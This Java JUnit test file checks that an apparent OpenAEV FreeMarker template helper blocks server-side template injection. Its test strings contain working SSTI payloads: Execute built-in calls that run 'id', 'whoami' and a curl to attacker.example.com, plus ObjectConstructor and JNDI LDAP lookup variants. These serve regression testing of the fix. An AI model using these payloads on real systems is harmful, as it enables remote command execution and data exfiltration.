package io.openaev.helper;

import static org.junit.jupiter.api.Assertions.*;

import freemarker.template.TemplateException;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

@DisplayName("TemplateHelper")
class TemplateHelperTest {

  /**
   * Builds a data map simulating an inject context with user and exercise variables, similar to
   * what {@link io.openaev.execution.ExecutionContext} provides.
   */
  private static Map<String, Object> injectContext() {
    Map<String, Object> context = new HashMap<>();
    context.put("user_firstname", "John");
    context.put("user_lastname", "Doe");
    context.put("user_email", "john.doe@example.com");
    context.put("exercise_name", "Crisis Simulation");
    return context;
  }

  @Nested
  @DisplayName("SSTI protection — inject subject injection")
  class SstiProtection {

    @Test
    @DisplayName(
        "given inject subject with Execute payload should not run OS command")
    void given_inject_subject_with_execute_payload_should_not_run_os_command()
        throws IOException, TemplateException {
      // -- Arrange --
      // Attacker submits an inject whose subject contains an SSTI payload
      String maliciousSubject =
          "${\"freemarker.template.utility.Execute\"?new()(\"id\")}";
      Map<String, Object> context = injectContext();

      // -- Act --
      String rendered = TemplateHelper.buildContentWithDataMap(maliciousSubject, context);

      // -- Assert --
      // If the command executed, output would contain OS user info (e.g. "uid=")
      assertFalse(rendered.contains("uid="),
          "Execute built-in must not run OS commands — SAFER_RESOLVER may be missing");
    }

    @Test
    @DisplayName(
        "given inject subject with curl exfiltration should not execute curl")
    void given_inject_subject_with_curl_exfiltration_should_not_execute_curl()
        throws IOException, TemplateException {
      // -- Arrange --
      // Exact payload from the reported attack vector
      String maliciousSubject =
          "${\"freemarker.template.utility.Execute\"?new()(\"curl http://attacker.example.com/callback\")}";
      Map<String, Object> context = injectContext();

      // -- Act --
      String rendered = TemplateHelper.buildContentWithDataMap(maliciousSubject, context);

      // -- Assert --
      assertFalse(rendered.isEmpty(), "Template should produce some output");
      assertFalse(rendered.contains("<!DOCTYPE") || rendered.contains("HTTP"),
          "Execute built-in must not perform HTTP requests — SAFER_RESOLVER may be missing");
    }

    @Test
    @DisplayName(
        "given inject subject with ObjectConstructor should not instantiate classes")
    void given_inject_subject_with_object_constructor_should_not_instantiate()
        throws IOException, TemplateException {
      // -- Arrange --
      String maliciousSubject =
          "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.ProcessBuilder\")}";
      Map<String, Object> context = injectContext();

      // -- Act --
      String rendered = TemplateHelper.buildContentWithDataMap(maliciousSubject, context);

      // -- Assert --
      assertFalse(rendered.contains("ProcessBuilder"),
          "ObjectConstructor must not instantiate arbitrary classes — SAFER_RESOLVER may be missing");
    }

    @Test
    @DisplayName(
        "given inject subject with JndiObjectFactory should not perform JNDI lookup")
    void given_inject_subject_with_jndi_should_not_perform_lookup()
        throws IOException, TemplateException {
      // -- Arrange --
      String maliciousSubject =
          "${\"freemarker.template.utility.JndiObjectFactory\"?new()(\"ldap://attacker.example.com/a\")}";
      Map<String, Object> context = injectContext();

      // -- Act --
      String rendered = TemplateHelper.buildContentWithDataMap(maliciousSubject, context);

      // -- Assert --
      assertFalse(rendered.contains("attacker.example.com"),
          "JndiObjectFactory must not perform JNDI lookups — SAFER_RESOLVER may be missing");
    }

    @Test
    @DisplayName(
        "given inject body mixing legitimate vars and SSTI should resolve vars but block attack")
    void given_inject_body_with_mixed_content_should_resolve_vars_but_block_attack()
        throws IOException, TemplateException {
      // -- Arrange --
      String maliciousBody =
          "Hello ${user_firstname}, "
              + "${\"freemarker.template.utility.Execute\"?new()(\"whoami\")} "
              + "welcome to ${exercise_name}";
      Map<String, Object> context = injectContext();

      // -- Act --
      String rendered = TemplateHelper.buildContentWithDataMap(maliciousBody, context);

      // -- Assert --
      assertTrue(rendered.contains("Hello John"),
          "Legitimate variables should still be resolved");
      assertTrue(rendered.contains("welcome to Crisis Simulation"),
          "Legitimate variables should still be resolved");
      // whoami would return a username string without "${"
      assertTrue(rendered.contains("${"),
          "Blocked SSTI expression should be preserved as literal text, not executed");
    }
  }

  @Nested
  @DisplayName("Normal template substitution")
  class NormalSubstitution {

    @Test
    @DisplayName("given valid inject subject with variables should resolve them")
    void given_valid_inject_subject_should_resolve_variables()
        throws IOException, TemplateException {
      // -- Arrange --
      String subject = "Action required for ${user_firstname} ${user_lastname}";
      Map<String, Object> context = injectContext();

      // -- Act --
      String rendered = TemplateHelper.buildContentWithDataMap(subject, context);

      // -- Assert --
      assertEquals("Action required for John Doe", rendered);
    }

    @Test
    @DisplayName("given null content should return empty string")
    void given_null_content_should_return_empty_string()
        throws IOException, TemplateException {
      // -- Act --
      String rendered = TemplateHelper.buildContentWithDataMap(null, injectContext());

      // -- Assert --
      assertEquals("", rendered);
    }
  }
}
